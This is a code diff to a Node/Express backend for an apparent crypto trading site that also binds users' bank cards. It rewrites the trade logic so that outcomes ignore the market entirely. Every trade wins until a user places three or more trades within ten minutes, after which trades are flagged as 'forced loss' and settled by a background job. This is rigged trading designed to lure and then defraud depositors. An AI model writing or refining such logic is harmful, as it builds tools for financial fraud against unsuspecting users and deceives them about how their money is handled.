@@ -160,7 +160,7 @@ app.post('/bind-bank-card', (req, res) => {
   return res.json({ success: true });
 });
 
-// Updated trade route with full validation and logic
+// Place trade - store as pending, balance updated after timeframe, apply forced loss if >3 trades in 10min
 app.post('/place-trade', (req, res) => {
   if (!req.session.user) return res.status(401).json({ success: false, message: 'Not logged in' });
 
@@ -194,35 +194,34 @@ app.post('/place-trade', (req, res) => {
     return res.json({ success: false, message: 'Invalid timeframe' });
   }
 
-  // Only BTC/USDT paired with Buy UP yields a win, else loss
-  let isWin = false;
-  if (pair === 'BTC/USDT' && direction === 'Buy UP') {
-    isWin = true;
-  }
+  const TEN_MINUTES_MS = 10 * 60 * 1000;
+  const now = Date.now();
 
-  // Calculate profit or loss
-  const profitAmount = isWin ? tradeAmount * (profitPct / 100) : -tradeAmount;
+  // Count trades in last 10 minutes
+  const recentTradesCount = (user.trades || []).filter(t => now - new Date(t.timestamp).getTime() <= TEN_MINUTES_MS).length;
 
-  // Update balance after trade result
-  const newBalance = user.balance + profitAmount;
+  // This trade is forced loss if 3 or more trades in last 10 minutes
+  const isForcedLoss = recentTradesCount >= 3;
 
-  // Create trade object
+  // Create trade object with status 'pending' and store trade start time
   const trade = {
-    id: Date.now(),
+    id: now,
     pair,
     direction,
     amount: tradeAmount,
-    profit: profitAmount.toFixed(2),
-    result: isWin ? 'WIN' : 'LOSS',
     profitPercent: profitPct,
     timeframe: tradeTimeframe,
-    timestamp: new Date().toISOString()
+    timestamp: new Date(now).toISOString(),
+    startTime: now,
+    status: 'pending',
+    profit: 0,
+    result: null,
+    forcedLoss: isForcedLoss  // flag for forced loss
   };
 
-  // Update user balance and add trade
+  // Push trade but DO NOT update balance yet
   db.get('users')
     .find({ email: req.session.user.email })
-    .assign({ balance: newBalance })
     .get('trades')
     .push(trade)
     .write();
@@ -230,7 +229,76 @@ app.post('/place-trade', (req, res) => {
   return res.json({
     success: true,
     trade,
-    balance: newBalance.toFixed(2),
+    balance: user.balance.toFixed(2),  // balance unchanged at this point
+  });
+});
+
+// Background job: finalize trades after timeframe, check forcedLoss to set result and adjust balance accordingly
+setInterval(() => {
+  const users = db.get('users').value();
+  const now = Date.now();
+
+  users.forEach(user => {
+    let updated = false;
+
+    (user.trades || []).forEach(trade => {
+      if (trade.status === 'pending' && now >= trade.startTime + trade.timeframe * 1000) {
+        let profitAmount;
+        let result;
+
+        if (trade.forcedLoss) {
+          // Forced loss: user loses amount * profitPercent
+          profitAmount = -(trade.amount * (trade.profitPercent / 100));
+          result = 'LOSS';
+        } else {
+          // Normal win
+          profitAmount = trade.amount * (trade.profitPercent / 100);
+          result = 'WIN';
+        }
+
+        db.get('users')
+          .find({ email: user.email })
+          .assign({ balance: user.balance + profitAmount })
+          .get('trades')
+          .find({ id: trade.id })
+          .assign({
+            profit: profitAmount.toFixed(2),
+            result: result,
+            status: 'completed'
+          })
+          .write();
+
+        updated = true;
+      }
+    });
+
+    if (updated) {
+      // Optional: logging or notifications could happen here
+    }
+  });
+}, 5000); // every 5 seconds
+
+// New endpoint: get active pending trade and remaining time, if any
+app.get('/active-trade', (req, res) => {
+  if (!req.session.user) return res.status(401).json({ error: 'Not logged in' });
+
+  const user = db.get('users').find({ email: req.session.user.email }).value();
+  if (!user) return res.status(404).json({ error: 'User not found' });
+
+  const pendingTrade = (user.trades || []).find(t => t.status === 'pending');
+
+  if (!pendingTrade) {
+    return res.json({ active: false });
+  }
+
+  const now = Date.now();
+  const elapsed = now - pendingTrade.startTime;
+  const remaining = pendingTrade.timeframe * 1000 - elapsed;
+
+  return res.json({
+    active: true,
+    trade: pendingTrade,
+    remaining: remaining > 0 ? Math.ceil(remaining / 1000) : 0
   });
 });
 
